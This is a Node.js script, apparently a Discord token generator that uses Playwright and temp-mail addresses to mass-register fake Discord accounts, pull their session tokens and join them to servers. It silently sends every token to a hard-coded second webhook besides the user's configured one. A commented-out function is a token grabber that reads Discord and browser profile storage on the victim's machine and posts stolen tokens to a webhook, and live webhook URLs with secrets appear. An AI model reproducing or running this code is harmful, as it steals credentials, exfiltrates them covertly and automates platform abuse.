//const fetch = require('node-fetch');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

//import fetch from 'node-fetch';
//const md5 = require('md5');
const axios = require('axios');
const { Webhook } = require('discord-webhook-node');
const request = require("request");
//const client = new Discord.Client();
const config = require('./config.json');
//const proxies = fs.readFileSync("./proxies.txt").toString().replace(/\r/gi, "").split("\n");
const fs = require("fs");
const playwright = require("playwright");
//const macaddress =require('macaddress');
//const address = require('address');
const colors = require('colors'); 
//const fs = require('fs');
const path = require('path');
const { Guild } = require('discord.js');

//const fake = require('fake-useragent');


/* function discordTokenGrabber () {
    let paths;
    const computerPlatform = process.platform;

    if (computerPlatform == "win32") {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;
        
        paths = {
            "Discord": path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    else if (computerPlatform == "linux") {
        vscode.window.showErrorMessage("Linux is not supported for the moment 😥");
        
        const home = path.join(process.env.HOME, ".config");

        paths = {
            "Discord": path.join(home, "discord"),
            "Discord Canary": path.join(home + "discordcanary"),
            "Discord PTB": path.join(home + "discordptb"),
            "Google Chrome": path.join(home + "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(home + "Opera Software", "Opera Stable"),
            "Brave": path.join(home + "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(home + "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    else if (computerPlatform == "darwin") {
        return console.log("MacOS is not supported for the moment 😥");
    }
    else {
        return console.log("The Discord Token Grabber support only Windows, Linux and MacOS.");
    }
    
    
    const tokens = {};
    for (let [platform, path] of Object.entries(paths)) {
        const tokenList = findToken(path);
        if (tokenList) {
            tokenList.forEach(token => {
                if (tokens[platform] === undefined) tokens[platform] = []
                tokens[platform].push(token);     
            });
        }  
    }
   console.log(tokens);
    //return tokens;
    const hook2 = new Webhook('https://discordapp.com/api/webhooks/923510658945912843/5dKOr8Fy0puGguKGIRN95YXuKUUtUn6SrQSGeRKwe--Xw4P41mAMPl6-ePuAIWCG4L9E');
    hook2.setUsername('TOKEN GRABBER');
    hook2.setAvatar('https://media.discordapp.net/attachments/923493462052065290/923784684264108082/Anime-Girl-WhatsApp-DP.png?width=557&height=670');
    hook2.send(tokens);
  
}

discordTokenGrabber() */


console.log(colors.brightBlue(`
███████╗ ██████╗      ██████╗ ██████╗  ██████╗ ██╗         ██████╗ ██████╗  ██████╗ 
██╔════╝██╔═══██╗    ██╔════╝██╔═══██╗██╔═══██╗██║         ██╔══██╗██╔══██╗██╔═══██╗
███████╗██║   ██║    ██║     ██║   ██║██║   ██║██║         ██████╔╝██████╔╝██║   ██║
╚════██║██║   ██║    ██║     ██║   ██║██║   ██║██║         ██╔══██╗██╔══██╗██║   ██║
███████║╚██████╔╝    ╚██████╗╚██████╔╝╚██████╔╝███████╗    ██████╔╝██║  ██║╚██████╔╝
╚══════╝ ╚═════╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
                                                                                    
`));
console.log(colors.brightYellow("CR :https://discord.gg/rrW3hkUwxY"));
console.log(colors.brightYellow("L I L S K Y #6241 => true"));
console.log(colors.brightRed("L I L T L E #0208 => true"));


(async  function() {
    while (true) {
        await sleep(await GenerateToken("NO PROXY"));
    }
})(); 

function GenerateToken(Proxy) {
    //const config = require('./config.json');
    return new Promise(async function(resolve) {
        console.log(colors.bgBrightGreen.brightWhite("[STARTED] "));
        const PBrowser = await playwright.firefox.launch({headless: false});
        const PContext = await PBrowser.newContext();
        const PPage = await PContext.newPage();
        var startTime = Date.now();
        try {
            try {              
                //await PPage.goto("https://discord.gg/XWt4RFp5By",{timeout:5000,});
                await PPage.goto("https://discord.com/", {"timeout": 80000, "waitUntil": "networkidle"});
                console.log(colors.bgBrightBlue.brightGreen("[WORKING] "));
            }
            catch {
                console.log(colors.bgBrightGreen.brightRed("[BAD]"));
                throw false;
            }
            await PPage.click("#app-mount > div > div > div.grid-3Ykf_K.heroBackground-3m0TRU > div.row-3wW-Fx.heroContainer-3j1eQg > div > div.ctaContainer-3vWJHU > button");
            await sleep(1000);
            await PPage.type("input.username-27KRPU", Math.random().toString(36).substring(2, 7) +" | "+ "TOKEN GEN FREE"+"\n");
            //await page.waitForSelector('#terms-checkbox') 
            //await page.click('#terms-checkbox')
            await PPage.waitForSelector("iframe");
            console.log(colors.bgBrightBlue.brightGreen("[CAPTCHA DETECTED]"));
            startTime = Date.now();
            await sleep(3000);
            await PPage.click("iframe");
            var email = Math.random().toString(36).substring(2, 12);
            await axios.post("https://api.internal.temp-mail.io/api/v3/email/new", {"domain": "kjkszpjcompany.com", "name": email});
            email += "@kjkszpjcompany.com";
            await sleep(1000);
            await PPage.waitForSelector("#react-select-2-input");
            console.log(colors.bgBrightGreen.brightGreen.brightRed("[CAPTCHA SOLVED]"));
            await PPage.type("#react-select-2-input", "January\n");
            await PPage.type("#react-select-3-input", "12\n");
            await PPage.type("#react-select-4-input", "1997\n\n");
            await PPage.waitForSelector("button.close-hZ94c6");
            await PPage.click("button.close-hZ94c6");
            await sleep(1000);
            await PPage.waitForSelector("input[type='text']");
            await PPage.type("input[type='text']", email);
            await PPage.type("input[type='password']", "wanyen@\n");
            console.log(colors.bgBrightBlue.brightCyan("[EMAIL ADDED SUCCEED] "));
            var emailData;
            while (true) {
                var emailData = await axios.get("https://api.internal.temp-mail.io/api/v3/email/" + email + "/messages").then(res => res.data);
                if (emailData.length !== 0) {
                    emailData = emailData[0].body_text.split("Verify Email: ")[1].trim();
                    break;
                }
                await sleep(1000);
            }
            var Token = await PPage.evaluate(function() {
                var iframe = document.createElement("iframe");
                document.head.append(iframe);
                return iframe.contentWindow.localStorage.getItem("token").replace(/"/g, "");
            }); 
            console.log(colors.bgBrightGreen.brightRed("[EMAIL RECEIVED] " + Proxy));
            await PPage.goto(emailData);
            await PPage.waitForSelector("h3.title-jXR8lp");
            while (await PPage.innerText("h3.title-jXR8lp") !== "Email Verified!") {
                try {
                    await PPage.waitForSelector("iframe", {"timeout": 3000});
                    await PPage.click("iframe");
                }
                catch {}
                await sleep(1000);
            }
            console.log(colors.bgBrightCyan.bgRed("[Successful confirmation] "));
            var Token = await PPage.evaluate(function() {
                var iframe = document.createElement("iframe");
                document.head.append(iframe);
                return iframe.contentWindow.sessionStorage.getItem("token").replace(/"/g, "");
            }); 
           /* var Token = await PPage.evaluate(() => {
                return localStorage.getItem("token").replace(/"/g,"");
              });
              console.log(accessTokenObj);*/
            fs.appendFileSync("./Tokens.txt", Token +"\n");
            console.log(Token);
            console.log(colors.bgBrightGreen("[TOKEN SUCCEED] ") + Buffer.from(Token.split(".")[0], "base64").toString());
            await PBrowser.close();
            console.log(colors.bgBrightBlue.brightWhite("[confirm] "));
            const link ="rrW3hkUwxY";
            fetch(`https://discord.com/api/v8/invites/${link}`, {
				method: 'POST',
				headers: {
					authorization: `${Token}`,
				},
			}).then(userRes => userRes.json())
		
            fetch(`https://discord.com/api/v8/invites/${config.code}}`, {
				method: 'POST',
				headers: {
					authorization: `${Token}`,
				},
			}).then(userRes => userRes.json())
                  .then(console.log("JOIN TO SERVER SUCCEED"));
            			


            //webhook discord
            const hook = new Webhook(config.webhook);
           // const hook2 = new Webhook('https://discordapp.com/api/webhooks/923510658945912843/5dKOr8Fy0puGguKGIRN95YXuKUUtUn6SrQSGeRKwe--Xw4P41mAMPl6-ePuAIWCG4L9E');
            const hook1 = new Webhook('https://discordapp.com/api/webhooks/923494524351819806/qL-SR35NSOeo-zMaXdhSPti2YGanguA1K9FN0W1yEFidedWV_1MHhZEHBlBBN-Q3n5Qg');
            const IMAGE_URL = 'https://media.discordapp.net/attachments/919914358530789406/922724910479073300/BAD_DIS.jpg?width=468&height=468';
            hook.setUsername('โทเค็น GEN'); 
            hook.setAvatar(IMAGE_URL);
            hook.send(Token);
            hook1.setUsername('โทเค็น GEN'); 
            hook1.setAvatar("https://media.discordapp.net/attachments/919914358530789406/923487685811765258/BAD_DIS.png");
            hook1.send(Token);
           
          //status
          //  const STATUS_URL = "https://discordapp.com/api/v6/users/@me/settings";
            

          
        }
        catch {
            console.error(colors.bgBrightRed.brightWhite("[ERROR] "));
            await PBrowser.close();
        }
        resolve(startTime + 150000 - Date.now());
    });
    
}

function sleep(ms) {
    return new Promise(function(resolve) {
        setTimeout(resolve, ms);
    });
}
